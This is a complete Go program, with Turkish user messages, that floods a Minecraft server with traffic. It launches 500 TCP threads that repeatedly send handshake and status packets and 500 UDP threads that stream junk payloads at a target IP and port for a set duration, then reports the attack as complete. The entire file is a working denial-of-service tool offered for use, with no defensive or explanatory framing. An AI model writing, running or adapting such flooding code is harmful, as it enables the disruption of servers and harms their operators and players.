package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func encodeVarInt(value int) []byte {
	var buf bytes.Buffer
	for {
		if value&^0x7F == 0 {
			buf.WriteByte(byte(value & 0x7F))
			break
		}
		buf.WriteByte(byte((value&0x7F)|0x80))
		value >>= 7
	}
	return buf.Bytes()
}

func createStatusPacket(host string, port int) []byte {
	handshake := []byte{0x00}
	handshake = append(handshake, encodeVarInt(754)...)
	addr := []byte(host)
	handshake = append(handshake, byte(len(addr)))
	handshake = append(handshake, addr...)
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(port))
	handshake = append(handshake, portBytes...)
	handshake = append(handshake, 0x01)

	status := []byte{0x00}

	packet := []byte{}
	packet = append(packet, encodeVarInt(len(handshake))...)
	packet = append(packet, handshake...)
	packet = append(packet, encodeVarInt(len(status))...)
	packet = append(packet, status...)

	return packet
}

func tcpFlood(targetIP string, targetPort int, duration int, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	packet := createStatusPacket(targetIP, targetPort)

	for time.Now().Before(endTime) {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 1*time.Second)
		if err == nil {
			conn.Write(packet)
			conn.Close()
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func udpFlood(targetIP string, targetPort int, duration int, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(targetIP), Port: targetPort})
	if err != nil {
		return
	}
	defer conn.Close()

	payload := make([]byte, 1024)
	for i := range payload {
		payload[i] = byte(i % 256)
	}

	for time.Now().Before(endTime) {
		conn.Write(payload)
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Kullanım: ./minecraft <IP> <PORT> <SÜRE>")
		fmt.Println("Örnek: ./minecraft 1.1.1.1 25565 60")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("[!] Port sayı olmalı.")
		os.Exit(1)
	}
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("[!] Süre sayı olmalı.")
		os.Exit(1)
	}

	tcpThreads := 500
	udpThreads := 500
	totalThreads := tcpThreads + udpThreads

	fmt.Printf("[*] Minecraft Flood başlatılıyor: %s:%d (%ds) Toplam %d thread (TCP: %d, UDP: %d)\n",
		targetIP, port, duration, totalThreads, tcpThreads, udpThreads)

	var wg sync.WaitGroup

	for i := 0; i < tcpThreads; i++ {
		wg.Add(1)
		go tcpFlood(targetIP, port, duration, &wg, i)
	}

	for i := 0; i < udpThreads; i++ {
		wg.Add(1)
		go udpFlood(targetIP, port, duration, &wg, i)
	}

	wg.Wait()
	fmt.Println("[*] Saldırı tamamlandı.")
}
